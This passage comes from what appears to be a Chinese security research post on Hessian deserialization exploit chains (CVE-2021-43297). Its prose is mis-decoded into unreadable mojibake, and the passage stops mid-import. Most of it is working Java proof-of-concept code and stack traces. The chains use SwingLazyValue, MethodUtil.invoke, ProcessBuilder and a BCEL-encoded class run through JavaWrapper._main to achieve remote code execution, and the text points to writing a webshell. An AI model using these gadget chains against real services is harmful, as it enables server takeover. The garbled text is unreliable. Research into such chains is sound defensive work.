</p><p>HessianæœåŠ¡ç«¯åœ¨è¿˜åŸMapç±»å‹æ•°æ®æ—¶ï¼Œä¼šè°ƒç”¨putæ–¹æ³•ï¼Œåœ¨putæ–¹æ³•ä¸­ä¼šè§¦å‘keyã€valueçš„equals&#x2F;hashCodeç­‰æ“ä½œï¼Œè¿™æ˜¯ååºåˆ—åŒ–é“¾çš„å¼€å§‹ã€‚å¦å¤–åœ¨Hessianååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå®¢æˆ·ç«¯æŒ‡å®šçš„ç±»å‹typeä¸å®é™…å¯¹è±¡ç±»å‹ä¸ä¸€è‡´æ—¶ä¼šè°ƒç”¨å¼‚å¸¸å¤„ç†å‡½æ•°exceptï¼Œè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨obj#toStringæ–¹æ³•æ‰“å°objã€‚è¿™ä¸ªæ´è¢«åˆ†é…äº†ç¼–å·CVE-2021-43297ã€‚æ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¸ºHessianååºåˆ—åŒ–é“¾å¢åŠ äº†ä¸€ä¸ªå…¥å£ï¼štoStringæ–¹æ³•ã€‚ç°åœ¨å¯ç”¨çš„å…¥å£æ–¹æ³•ï¼šequals&#x2F;hashCode&#x2F;toString&#x2F;compareTo</p><p>å¦å¤–Hashtable#equalsæ–¹æ³•ä¼šè§¦å‘å…¶valueå€¼çš„getæ–¹æ³•ï¼Œåœ¨JDKä¸­å­˜åœ¨<code>javax.swing.UIDefaults#get(Object)-&gt;sun.swing.SwingLazyValue#createValue-&gt;sun.reflect.misc.MethodUtil#invoke(static)</code>è¿™æ¡é“¾è·¯ï¼Œ<strong>æ–¹æ³•sun.swing.SwingLazyValue#createValueå¯ä»¥è°ƒç”¨ä»»æ„é™æ€æ–¹æ³•æˆ–è€…æ˜¯ä»»æ„ç±»çš„æ„é€ æ–¹æ³•ï¼ˆva2ï¼‰</strong>ï¼Œæ‰€ä»¥Hessian JDKåŸç”Ÿé“¾åŸºæœ¬éƒ½æ˜¯å¯»æ‰¾<code>é™æ€å‡½æ•°---&gt;RCE</code>çš„é“¾è·¯ï¼Œä¸»è¦æœ‰ä¸¤ç§æ€è·¯ï¼š1ã€ä¿®æ”¹ç¯å¢ƒé…ç½®ï¼Œç»•è¿‡JDKå®‰å…¨é™åˆ¶ï¼›2ã€é™æ€æ–¹æ³•ç›´æ¥è§¦å‘RCEã€‚å½“ç„¶è¿˜æœ‰ä»xxx.toString-&gt;invoke()-&gt;static function-&gt;rceçš„é“¾è·¯</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/34.png"></p><h5 id="3-3-3-1-MethodUtils-invoke"><a href="#3-3-3-1-MethodUtils-invoke" class="headerlink" title="3.3.3.1  MethodUtils.invoke"></a>3.3.3.1  MethodUtils.invoke</h5><p>æœ‰å¸ˆå‚…æ‰¾åˆ°äº†sun.reflect.misc.MethodUtil#invokeè¿™ä¸ªé™æ€æ–¹æ³•ï¼Œå°†è°ƒç”¨ä»»æ„é™æ€æ–¹æ³•è½¬åŒ–ä¸ºäº†è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œç»“åˆProcessBuilder.startå®ŒæˆRCE</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/35.png"></p><p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®çš„pocä»£ç </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static HashMap&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; getObject2() throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-keyword">Object</span> target = <span class="hljs-built_in">new</span> ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,&quot;calc&quot;);<br>        <span class="hljs-keyword">Method</span> invoke = sun.reflect.misc.MethodUtil.<span class="hljs-keyword">class</span>.getMethod(&quot;invoke&quot;, <span class="hljs-keyword">Method</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">Object</span>[].<span class="hljs-keyword">class</span>);<br>        <span class="hljs-keyword">Method</span> start = ProcessBuilder.<span class="hljs-keyword">class</span>.getMethod(&quot;start&quot;);<br>        SwingLazyValue swingLazyValue = <span class="hljs-built_in">new</span> SwingLazyValue(<br>                &quot;sun.reflect.misc.MethodUtil&quot;,<br>                &quot;invoke&quot;,<br>                <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;invoke, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>(), <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;<span class="hljs-keyword">start</span>, target, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&#125;&#125;&#125;);<br>        <span class="hljs-keyword">Object</span>[] keyValueList = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&quot;abc&quot;,swingLazyValue&#125;;<br>        UIDefaults uiDefaults1 = <span class="hljs-built_in">new</span> UIDefaults(keyValueList);<br>        UIDefaults uiDefaults2 = <span class="hljs-built_in">new</span> UIDefaults(keyValueList);<br><br>        Hashtable&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; hashtable1 = <span class="hljs-built_in">new</span> Hashtable&lt;&gt;();<br>        Hashtable&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; hashtable2 = <span class="hljs-built_in">new</span> Hashtable&lt;&gt;();<br>        hashtable1.put(&quot;a&quot;,uiDefaults1);<br>        hashtable2.put(&quot;a&quot;,uiDefaults2);<br>        <span class="hljs-keyword">return</span> MakeUtils.makeMap(hashtable1,hashtable2);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ•´ä½“çš„è°ƒç”¨æ ˆï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">start:</span><span class="hljs-number">1007</span>, ProcessBuilder (java.lang)<br>invokeè°ƒç”¨<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">275</span>, MethodUtil (sun.reflect.misc)<br>invokeè°ƒç”¨<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">813</span>, Hashtable (java.util)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">813</span>, Hashtable (java.util)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">634</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">611</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/36.png"></p><h5 id="3-3-2-PKCS9Attributes-toString-gt-JavaWrapper-main"><a href="#3-3-2-PKCS9Attributes-toString-gt-JavaWrapper-main" class="headerlink" title="3.3.2 PKCS9Attributes#toString-&gt;JavaWrapper._main"></a>3.3.2 PKCS9Attributes#toString-&gt;JavaWrapper._main</h5><p>è¿™æ¡é“¾çš„å‰åŠéƒ¨åˆ†åˆ©ç”¨äº†<code>PKCS9Attributes#toString-&gt;UIDefaults#get </code>ï¼ŒååŠéƒ¨åˆ†é™æ€æ–¹æ³•ä½¿ç”¨çš„æ˜¯<code>com.sun.org.apache.bcel.internal.util.JavaWrapper#_main</code>ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­classloaderï¼ˆcom.sun.org.apache.bcel.internal.util.ClassLoaderï¼‰åŠ è½½bcelä¸²å¾—åˆ°classï¼Œæ¥ç€å†è°ƒç”¨è‡ªå®šä¹‰ç±»çš„ <code>_main</code> æ–¹æ³•ã€‚å¦å¤–bcelclassloader com.sun.org.apache.bcel.internal.util.ClassLoader#loadClassåŠ è½½classæ—¶ä½¿ç”¨çš„æ˜¯defineClassè€Œä¸æ˜¯Class.forNameï¼Œä¸ä¼šç›´æ¥åŠ è½½é™æ€ä»£ç å—ä¸­çš„ä»£ç ï¼Œæ‰€ä»¥éœ€è¦å°†æ‰§è¡Œçš„ä»£ç å†™å…¥åˆ° <code>_main</code>æ–¹æ³•ä¸­å®Œæˆåˆ©ç”¨</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/37.png"></p><p>ç”Ÿæˆåºåˆ—åŒ–æ•°æ®çš„pocä»£ç ï¼Œè¿™ä¸ªéœ€è¦æ³¨æ„åœ¨åºåˆ—åŒ–æ•°æ®æ—¶æå‰å†™å…¥ä¸€ä¸ªå­—ç¬¦å¯¼è‡´è§¦å‘expectè¿›è€Œå®Œæˆ<code>Hessian2Input#readObject---&gt;XXX.toString</code>å¾—é“¾è·¯è¿æ¥ã€‚ç»ç ”ç©¶ï¼Œé™¤äº†67ï¼Œå¦å¤–79ã€81ã€86ã€88éƒ½æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºéƒ½è°ƒç”¨äº†readIntï¼Œæœ€ç»ˆéƒ½å¯ä»¥è§¦å‘expectæ–¹æ³•</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import com.sun.org.apache.bcel.internal.Repository;<br>import com.sun.org.apache.bcel.internal.classfile.Utility;<br>import org.utils.Payload;<br>import org.utils.Reflections;<br>import sun.reflect.ReflectionFactory;<br>import sun.security.pkcs.PKCS9Attribute;<br>import sun.security.pkcs.PKCS9Attributes;<br>import sun.swing.SwingLazyValue;<br>import javax.swing.*;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.InvocationTargetException;<br><br>public <span class="hljs-keyword">class</span> JavaWrapperBcel &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Payload</span>.</span></span>run267(get<span class="hljs-constructor">JavaWrapperBcelObject()</span>);<br>    &#125;<br>    public static Object get<span class="hljs-constructor">JavaWrapperBcelObject()</span> throws Exception &#123;<br>        PKCS9Attributes s = create<span class="hljs-constructor">WithoutConstructor(PKCS9Attributes.<span class="hljs-params">class</span>)</span>;<br>        UIDefaults uiDefaults = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UIDefaults()</span>;<br>        String payload = <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(EvilMain.<span class="hljs-params">class</span>)</span>.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(payload);<br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-constructor">SwingLazyValue(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;<span class="hljs-params">new</span> String[]&#123;<span class="hljs-params">payload</span>&#125;&#125;)</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Reflections</span>.</span></span>set<span class="hljs-constructor">FieldValue(<span class="hljs-params">s</span>,<span class="hljs-string">&quot;attributes&quot;</span>,<span class="hljs-params">uiDefaults</span>)</span>;<br>        return s;<br>    &#125;<br>    public static &lt;T&gt; T create<span class="hljs-constructor">WithoutConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        return create<span class="hljs-constructor">WithConstructor(<span class="hljs-params">classToInstantiate</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">new</span> Class[0], <span class="hljs-params">new</span> Object[0])</span>;<br>    &#125;<br><br>    public static &lt;T&gt; T create<span class="hljs-constructor">WithConstructor(Class&lt;T&gt; <span class="hljs-params">classToInstantiate</span>, Class&lt;? <span class="hljs-params">super</span> T&gt; <span class="hljs-params">constructorClass</span>, Class&lt;?&gt;[] <span class="hljs-params">consArgTypes</span>, Object[] <span class="hljs-params">consArgs</span>)</span> throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        Constructor&lt;? super T&gt; objCons = constructorClass.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">consArgTypes</span>)</span>;<br>        objCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>        Constructor&lt;?&gt; sc = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ReflectionFactory</span>.</span></span>get<span class="hljs-constructor">ReflectionFactory()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">ConstructorForSerialization(<span class="hljs-params">classToInstantiate</span>, <span class="hljs-params">objCons</span>)</span>;<br>        sc.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>        return (T) sc.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">consArgs</span>)</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/38.png"></p><p>è°ƒç”¨æ ˆï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">exec:</span><span class="hljs-number">347</span>, Runtime (java.lang)<br><span class="hljs-symbol">_main:</span><span class="hljs-number">5</span>, $$BCEL$$$l<span class="hljs-number">$8b</span><span class="hljs-number">$I</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><span class="hljs-number">$AmQMO</span><span class="hljs-number">$c2</span><span class="hljs-number">$40</span><span class="hljs-number">$Q</span><span class="hljs-number">$7d</span><span class="hljs-number">$L</span><span class="hljs-number">$85</span><span class="hljs-number">$d2</span><span class="hljs-number">$8a</span><span class="hljs-number">$f2</span><span class="hljs-number">$r</span><span class="hljs-number">$f8</span><span class="hljs-number">$fd</span><span class="hljs-number">$7d</span><span class="hljs-number">$Q</span><span class="hljs-number">$3c</span><span class="hljs-number">$d8</span><span class="hljs-number">$8b</span><span class="hljs-number">$H</span><span class="hljs-number">$T</span><span class="hljs-number">$8c</span><span class="hljs-number">$X</span><span class="hljs-number">$a3</span><span class="hljs-number">$a7F</span><span class="hljs-number">$8d</span><span class="hljs-number">$Y</span><span class="hljs-number">$3cx0K</span><span class="hljs-number">$dd</span><span class="hljs-number">$d4</span><span class="hljs-number">$r</span><span class="hljs-number">$a5</span><span class="hljs-number">$rm</span><span class="hljs-number">$n</span><span class="hljs-number">$fc</span><span class="hljs-number">$z</span>$_j<span class="hljs-number">$3c</span><span class="hljs-number">$f8</span><span class="hljs-number">$D</span><span class="hljs-number">$fcQ</span><span class="hljs-number">$c6</span><span class="hljs-number">$d9j</span><span class="hljs-number">$acQ6</span><span class="hljs-number">$d9y</span><span class="hljs-number">$9973</span><span class="hljs-number">$ef</span><span class="hljs-number">$cdf</span><span class="hljs-number">$df</span><span class="hljs-number">$3f</span><span class="hljs-number">$5e</span><span class="hljs-number">$df</span><span class="hljs-number">$A</span><span class="hljs-number">$i</span><span class="hljs-number">$60</span><span class="hljs-number">$c7D</span><span class="hljs-number">$k</span><span class="hljs-number">$N</span><span class="hljs-number">$T</span><span class="hljs-number">$LX</span><span class="hljs-number">$y</span><span class="hljs-number">$60I</span><span class="hljs-number">$e1</span><span class="hljs-number">$b2</span><span class="hljs-number">$8e</span><span class="hljs-number">$V</span><span class="hljs-number">$j</span><span class="hljs-number">$ab</span><span class="hljs-number">$M</span><span class="hljs-number">$f9</span><span class="hljs-number">$p</span><span class="hljs-number">$e9</span><span class="hljs-number">$cb</span><span class="hljs-number">$f8</span><span class="hljs-number">$98</span><span class="hljs-number">$n</span><span class="hljs-number">$dblu</span><span class="hljs-number">$Z</span><span class="hljs-number">$b4</span><span class="hljs-number">$93</span><span class="hljs-number">$e0</span><span class="hljs-number">$5e0</span><span class="hljs-number">$94l</span><span class="hljs-number">$e9</span><span class="hljs-number">$8b</span><span class="hljs-number">$f3</span><span class="hljs-number">$d1</span><span class="hljs-number">$a0</span><span class="hljs-number">$t</span><span class="hljs-number">$c2k</span><span class="hljs-number">$de</span><span class="hljs-number">$f3</span><span class="hljs-number">$88</span><span class="hljs-number">$a9</span><span class="hljs-number">$da</span><span class="hljs-number">$81</span><span class="hljs-number">$c3</span><span class="hljs-number">$bd</span>$$$P<span class="hljs-number">$a5</span><span class="hljs-number">$ca</span><span class="hljs-number">$bfI</span><span class="hljs-number">$z</span><span class="hljs-number">$7e</span><span class="hljs-number">$90QR</span><span class="hljs-number">$L</span><span class="hljs-number">$5dKL</span><span class="hljs-number">$f8</span><span class="hljs-number">$60</span><span class="hljs-number">$e8</span><span class="hljs-number">$J</span><span class="hljs-number">$x</span><span class="hljs-number">$WQ</span><span class="hljs-number">$dcf</span><span class="hljs-number">$c8</span><span class="hljs-number">$dd</span><span class="hljs-number">$N</span><span class="hljs-number">$b8</span><span class="hljs-number">$f4</span><span class="hljs-number">$Z</span><span class="hljs-number">$g</span><span class="hljs-number">$cd</span><span class="hljs-number">$5b</span><span class="hljs-number">$bb</span><span class="hljs-number">$cf</span><span class="hljs-number">$c7</span><span class="hljs-number">$dc</span><span class="hljs-number">$f2</span><span class="hljs-number">$b8</span><span class="hljs-number">$efZ</span><span class="hljs-number">$9d8</span><span class="hljs-number">$94</span><span class="hljs-number">$be</span><span class="hljs-number">$dbN</span><span class="hljs-number">$acx</span><span class="hljs-number">$e8</span><span class="hljs-number">$8e</span><span class="hljs-number">$ZjS</span><span class="hljs-number">$ca</span><span class="hljs-number">$M</span><span class="hljs-number">$e6</span><span class="hljs-number">$e9</span><span class="hljs-number">$c4</span><span class="hljs-number">$R</span><span class="hljs-number">$c3X</span><span class="hljs-number">$G</span><span class="hljs-number">$7e</span><span class="hljs-number">$a4c</span><span class="hljs-number">$8d</span><span class="hljs-number">$f2N0</span><span class="hljs-number">$K</span><span class="hljs-number">$jq</span><span class="hljs-number">$s</span><span class="hljs-number">$95</span><span class="hljs-number">$ad</span><span class="hljs-number">$a1</span><span class="hljs-number">$y</span><span class="hljs-number">$f6</span><span class="hljs-number">$d5T</span><span class="hljs-number">$R</span><span class="hljs-number">$3a</span><span class="hljs-number">$K</span><span class="hljs-number">$3a</span><span class="hljs-number">$d6</span><span class="hljs-number">$8b</span><span class="hljs-number">$d8</span><span class="hljs-number">$c0</span><span class="hljs-number">$sI</span><span class="hljs-number">$d2</span><span class="hljs-number">$8aN</span><span class="hljs-number">$R</span><span class="hljs-number">$5b</span><span class="hljs-number">$d8f</span><span class="hljs-number">$u</span><span class="hljs-number">$ff</span><span class="hljs-number">$dd</span><span class="hljs-number">$89</span><span class="hljs-number">$a8</span><span class="hljs-number">$d4</span><span class="hljs-number">$e8</span><span class="hljs-number">$a2</span><span class="hljs-number">$d7</span><span class="hljs-number">$X</span><span class="hljs-number">$OQ</span><span class="hljs-number">$b5</span><span class="hljs-number">$94</span><span class="hljs-number">$faqd</span><span class="hljs-number">$a8</span><span class="hljs-number">$a4</span><span class="hljs-number">$ec</span><span class="hljs-number">$d5</span><span class="hljs-number">$c8</span><span class="hljs-number">$8f</span><span class="hljs-number">$e5</span><span class="hljs-number">$80LMW</span><span class="hljs-number">$c4</span><span class="hljs-number">$3fI</span><span class="hljs-number">$bd</span><span class="hljs-number">$d9</span><span class="hljs-number">$b2</span><span class="hljs-number">$ff</span><span class="hljs-number">$f5</span><span class="hljs-number">$d0</span><span class="hljs-number">$da</span><span class="hljs-number">$9a</span><span class="hljs-number">$98</span><span class="hljs-number">$I</span><span class="hljs-number">$87a</span><span class="hljs-number">$b79</span><span class="hljs-number">$e5</span><span class="hljs-number">$c9</span><span class="hljs-number">$bf</span><span class="hljs-number">$a8</span><span class="hljs-number">$cb0pD</span><span class="hljs-number">$U</span><span class="hljs-number">$b5i</span><span class="hljs-number">$d3</span><span class="hljs-number">$i</span><span class="hljs-number">$fd</span><span class="hljs-number">$8c</span><span class="hljs-number">$3a</span><span class="hljs-number">$Z0</span><span class="hljs-number">$f5</span><span class="hljs-number">$W</span><span class="hljs-number">$8a</span><span class="hljs-number">$Ge</span><span class="hljs-number">$W</span><span class="hljs-number">$n</span><span class="hljs-number">$p</span><span class="hljs-number">$cc</span><span class="hljs-number">$ed</span><span class="hljs-number">$3d</span><span class="hljs-number">$83</span><span class="hljs-number">$3d</span><span class="hljs-number">$se</span><span class="hljs-number">$93b</span><span class="hljs-number">$3e</span><span class="hljs-number">$n</span><span class="hljs-number">$b3</span><span class="hljs-number">$98</span><span class="hljs-number">$a1X</span><span class="hljs-number">$fcj</span><span class="hljs-number">$m</span><span class="hljs-number">$9c</span><span class="hljs-number">$r40</span><span class="hljs-number">$87</span><span class="hljs-number">$Su</span><span class="hljs-number">$a9</span><span class="hljs-number">$e1</span><span class="hljs-number">$c3D</span><span class="hljs-number">$M0</span>_<span class="hljs-number">$90</span><span class="hljs-number">$a9f</span><span class="hljs-number">$9f</span><span class="hljs-number">$a0</span><span class="hljs-number">$dd</span><span class="hljs-number">$a4</span><span class="hljs-number">$K</span><span class="hljs-number">$s</span><span class="hljs-number">$a1</span><span class="hljs-number">$9a2H</span><span class="hljs-number">$xU1QF</span><span class="hljs-number">$85</span><span class="hljs-number">$b0JW</span><span class="hljs-number">$p</span><span class="hljs-number">$a6Fw</span><span class="hljs-number">$3e</span><span class="hljs-number">$99</span><span class="hljs-number">$a9</span><span class="hljs-number">$7f</span><span class="hljs-number">$C</span><span class="hljs-number">$82</span><span class="hljs-number">$f0</span><span class="hljs-number">$e5</span><span class="hljs-number">$edD</span><span class="hljs-number">$C</span><span class="hljs-number">$A</span><span class="hljs-number">$A</span><br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">498</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">runMain:</span><span class="hljs-number">131</span>, JavaWrapper (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.bcel.internal.util)<br><span class="hljs-symbol">_main:</span><span class="hljs-number">153</span>, JavaWrapper (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.bcel.internal.util)<br><span class="hljs-symbol">invoke0:</span><span class="hljs-number">-1</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br><span class="hljs-symbol">invoke:</span><span class="hljs-number">498</span>, Method (java.lang.reflect)<br><span class="hljs-symbol">createValue:</span><span class="hljs-number">73</span>, SwingLazyValue (sun.swing)<br><span class="hljs-symbol">getFromHashtable:</span><span class="hljs-number">216</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">get:</span><span class="hljs-number">161</span>, UIDefaults (javax.swing)<br><span class="hljs-symbol">getAttribute:</span><span class="hljs-number">265</span>, PKCS9Attributes (sun.security.pkcs)<br><span class="hljs-symbol">toString:</span><span class="hljs-number">334</span>, PKCS9Attributes (sun.security.pkcs)<br><span class="hljs-symbol">valueOf:</span><span class="hljs-number">2994</span>, String (java.lang)<br><span class="hljs-symbol">append:</span><span class="hljs-number">131</span>, StringBuilder (java.lang)<br><span class="hljs-symbol">expect:</span><span class="hljs-number">2865</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readString:</span><span class="hljs-number">1407</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObjectDefinition:</span><span class="hljs-number">2163</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">2105</span>, Hessian2Input (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure><h5 id="3-3-3-com-sun-org-apache-xml-internal-security-utils-JavaUtils"><a href="#3-3-3-com-sun-org-apache-xml-internal-security-utils-JavaUtils" class="headerlink" title="3.3.3 com.sun.org.apache.xml.internal.security.utils.JavaUtils"></a>3.3.3 com.sun.org.apache.xml.internal.security.utils.JavaUtils</h5><p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´å¾—ï¼Œç›´æ¥å†™æ–‡ä»¶ï¼Œåœ¨webç¯å¢ƒä¸‹ç›´æ¥å†™webshellå°±è¡Œã€‚å½“ç„¶ä¹Ÿå¯ä»¥å…ˆå†™å…¥åŠ¨æ€é“¾æ¥åº“ï¼Œå†è°ƒç”¨ System#load åŠ è½½è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/39.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.JavaUtils;<br><span class="hljs-keyword">import</span> org.utils.MakeUtils;<br><span class="hljs-keyword">import</span> org.utils.Payload;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> 